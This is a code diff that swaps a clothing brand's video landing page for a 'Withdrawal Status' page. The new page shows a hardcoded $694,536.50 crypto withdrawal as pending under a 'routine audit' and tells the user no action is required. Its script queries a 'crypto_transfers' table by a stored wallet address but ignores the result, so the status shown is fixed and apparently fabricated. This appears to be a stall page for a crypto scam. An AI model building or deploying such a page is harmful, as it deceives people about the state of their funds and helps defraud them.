@@ -3,237 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>THE ONE - Clothing Brand</title>
+    <title>Withdrawal Status</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .container { background-color: #1e293b; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); width: 100%; max-width: 450px; text-align: center; position: relative; overflow: hidden; }
 
-        body, html {
-            height: 100%;
-            width: 100%;
-            overflow: hidden;
-            background-color: #000;
-        }
+        /* Header */
+        .icon-wrap { width: 80px; height: 80px; border-radius: 50%; background: rgba(245, 158, 11, 0.1); border: 2px solid rgba(245, 158, 11, 0.35); display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: pulse 2.4s ease-in-out infinite; }
+        .icon-wrap svg { width: 38px; height: 38px; }
+        @keyframes pulse { 0%,100%{ box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.2); } 50%{ box-shadow: 0 0 0 14px rgba(245, 158, 11, 0); } }
+        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
 
-        /* --- VIDEO CONTAINER --- */
-        #video-experience {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 10;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: #111;
-        }
+        h2 { font-size: 22px; font-weight: 700; color: #f8fafc; margin-bottom: 6px; }
+        .subtitle { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 22px; }
 
-        /* Video element styled to fit like a cinematic reel/TikTok style */
-        .story-video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            max-width: 500px; /* Gives it a clean mobile-portrait look on desktop */
-            box-shadow: 0 0 50px rgba(0,0,0,0.8);
-            background: #222;
-        }
+        .status-badge { display: inline-flex; align-items: center; gap: 7px; background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.4); border-radius: 20px; padding: 6px 16px; font-size: 12px; font-weight: 700; color: #f59e0b; letter-spacing: 0.06em; margin-bottom: 22px; }
+        .status-badge::before { content: ''; width: 7px; height: 7px; border-radius: 50%; background: #f59e0b; animation: blink 1.8s infinite; }
 
-        /* Interactive Trigger Overlay */
-        #click-prompt {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.75);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 20;
-            cursor: pointer;
-            transition: opacity 0.5s ease;
-        }
+        /* Info card */
+        .info-card { background: #0f172a; border: 1px solid #334155; border-radius: 12px; padding: 18px 20px; margin-bottom: 20px; text-align: left; }
+        .info-row { display: flex; justify-content: space-between; align-items: center; padding: 9px 0; border-bottom: 1px solid #1e293b; }
+        .info-row:last-child { border-bottom: none; padding-bottom: 0; }
+        .info-row:first-child { padding-top: 0; }
+        .info-label { font-size: 13px; color: #64748b; }
+        .info-value { font-size: 13px; color: #f8fafc; font-weight: 600; text-align: right; }
+        .info-value.amber { color: #f59e0b; }
 
-        .prompt-text {
-            color: #fff;
-            font-size: 1.3rem;
-            letter-spacing: 3px;
-            text-transform: uppercase;
-            border: 2px solid #fff;
-            padding: 15px 35px;
-            font-weight: 500;
-        }
-
-        /* Shop Button Overlay (Appears right when they smile at the screen) */
-        #shop-overlay {
-            position: absolute;
-            bottom: 12%;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 30;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.8s ease;
-        }
-
-        #shop-overlay.reveal {
-            opacity: 1;
-            pointer-events: auto;
-        }
-
-        .shop-btn {
-            padding: 18px 45px;
-            font-size: 1.1rem;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            background-color: #ffffff;
-            color: #000000;
-            border: none;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            transition: transform 0.2s, background-color 0.2s;
-        }
-
-        .shop-btn:hover {
-            transform: scale(1.05);
-            background-color: #f0f0f0;
-        }
-
-        /* --- THE FINAL WEBSITE HOMEPAGE --- */
-        #main-site {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-            background: #ffffff;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 1.2s ease, visibility 1.2s;
-        }
-
-        #main-site.active {
-            opacity: 1;
-            visibility: visible;
-            z-index: 50; /* Bring above video layer */
-        }
-
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 25px 50px;
-            border-bottom: 1px solid #eee;
-        }
-
-        .brand-name {
-            font-size: 2rem;
-            font-weight: 900;
-            text-transform: uppercase;
-            letter-spacing: 5px;
-            color: #000;
-        }
-
-        nav a {
-            text-decoration: none;
-            color: #333;
-            margin-left: 35px;
-            text-transform: uppercase;
-            font-size: 0.85rem;
-            font-weight: 600;
-            letter-spacing: 1px;
-        }
-
-        .hero-section {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: calc(100vh - 90px);
-            background: #fafafa;
-        }
-
-        .hero-heading {
-            font-size: 4.5rem;
-            font-weight: 800;
-            text-align: center;
-            text-transform: uppercase;
-            letter-spacing: 6px;
-            color: #111;
-        }
+        /* Reason box */
+        .reason-box { background: rgba(245,158,11,0.04); border: 1px solid rgba(245,158,11,0.25); border-radius: 10px; padding: 16px; text-align: left; }
+        .reason-box .r-title { font-size: 14px; font-weight: 700; color: #f59e0b; margin-bottom: 6px; display: flex; align-items: center; gap: 6px; }
+        .reason-box .r-desc { font-size: 13px; color: #94a3b8; line-height: 1.6; }
     </style>
 </head>
 <body>
+<div class="container">
 
-    <div id="video-experience">
-        <div id="click-prompt" onclick="playCinematic()">
-            <div class="prompt-text">Enter Experience</div>
+    <div class="icon-wrap">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>
+        </svg>
+    </div>
+
+    <h2>Withdrawal Processing</h2>
+    <p class="subtitle">Your withdrawal request of <strong style="color:#f8fafc;">$694,536.50</strong> is currently under review by our operations team.</p>
+
+    <div class="status-badge">⏳ PENDING</div>
+
+    <div class="info-card">
+        <div class="info-row">
+            <span class="info-label">Withdrawal Amount</span>
+            <span class="info-value">$694,536.50</span>
         </div>
-
-        <video id="brandVideo" class="story-video" playsinline>
-            <source src="your-video-file.mp4" type="video/mp4">
-            Your browser does not support the video tag.
-        </video>
-
-        <div id="shop-overlay">
-            <button class="shop-btn" onclick="revealWebsite()">Shop "The One"</button>
+        <div class="info-row">
+            <span class="info-label">Status</span>
+            <span class="info-value amber">Awaiting Review</span>
         </div>
     </div>
 
-    <div id="main-site">
-        <header>
-            <div class="brand-name">THE ONE</div>
-            <nav>
-                <a href="#">Collections</a>
-                <a href="#">The Wardrobe</a>
-                <a href="#">Our Story</a>
-            </nav>
-        </header>
-        
-        <main class="hero-section">
-            <h1 class="hero-heading">Found.<br>Triumphant.</h1>
-        </main>
+    <div class="reason-box">
+        <div class="r-title">🔍 Under Routine Audit</div>
+        <div class="r-desc">
+            Due to the standard compliance parameters associated with larger volume transactions, this payout is undergoing a routine safety check. No action is required on your part. Processing will continue automatically once the ledger validation clears.
+        </div>
     </div>
 
-    <script>
-        const video = document.getElementById('brandVideo');
-        const prompt = document.getElementById('click-prompt');
-        const shopOverlay = document.getElementById('shop-overlay');
-        const mainSite = document.getElementById('main-site');
+</div>
 
-        function playCinematic() {
-            // Hide entry overlay prompt
-            prompt.style.opacity = '0';
-            setTimeout(() => prompt.style.display = 'none', 500);
+<script>
+    const SUPABASE_URL  = 'https://kmjmqrrmzdtovovzigxk.supabase.co';
+    const SUPABASE_ANON = 'sb_publishable_y8Ai2hQcJfHSU5ilkEFCSg_lmh1_leb';
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON);
 
-            // Play the video file
-            video.play();
+    async function checkStatus() {
+        const wallet = localStorage.getItem('active_wallet');
+        if (!wallet) return;
+        try {
+            await supabaseClient
+                .from('crypto_transfers')
+                .select('id')
+                .eq('wallet_address', wallet)
+                .limit(1);
+        } catch (err) {
+            console.error('Connection error:', err);
         }
+    }
 
-        // Listen to the timing of the video clip
-        video.addEventListener('timeupdate', () => {
-            // ADJUST THIS NUMBER: Change 6.0 to the exact second in your video 
-            // where the actor turns around, smiles, and holds the clothes up.
-            if (video.currentTime >= 6.0) {
-                shopOverlay.classList.add('reveal');
-            }
-        });
-
-        // Loop fallback: If they miss the button, keep it on screen at the end frame
-        video.addEventListener('ended', () => {
-            shopOverlay.classList.add('reveal');
-        });
-
-        function revealWebsite() {
-            // Smoothly dissolve out video context and activate main landing site
-            mainSite.classList.add('active');
-        }
-    </script>
+    window.onload = checkStatus;
+</script>
 </body>
 </html>
